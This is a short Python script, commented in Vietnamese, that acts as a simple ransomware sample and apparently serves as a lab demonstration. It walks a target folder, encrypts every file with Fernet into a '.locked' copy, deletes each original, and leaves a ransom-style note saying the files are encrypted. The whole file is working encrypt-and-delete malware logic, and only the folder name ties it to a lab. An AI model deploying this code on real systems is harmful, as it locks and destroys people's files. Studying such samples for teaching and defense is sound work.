import os
from cryptography.fernet import Fernet

# Thư mục chứa file sẽ bị mã hóa
TARGET_DIR = "lab_files"

# Nếu chưa có key thì tạo mới
def load_or_create_key():
    if not os.path.exists("secret.key"):
        key = Fernet.generate_key()
        with open("secret.key", "wb") as f:
            f.write(key)
    else:
        with open("secret.key", "rb") as f:
            key = f.read()
    return key

def encrypt_file(filepath, fernet):
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ".locked", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)  # Xóa file gốc

def main():
    key = load_or_create_key()
    fernet = Fernet(key)

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            filepath = os.path.join(root, file)
            if not file.endswith(".locked"):
                encrypt_file(filepath, fernet)

        # Tạo note đòi chuộc (ghi UTF-8 để không bị lỗi emoji)
    with open(os.path.join(TARGET_DIR, "README_RESTORE.txt"), "w", encoding="utf-8") as f:
        f.write("💀 Tất cả file của bạn đã bị mã hóa!\n")
        f.write("Để khôi phục, chạy script decrypt.py cùng với secret.key\n")

if __name__ == "__main__":
    main()
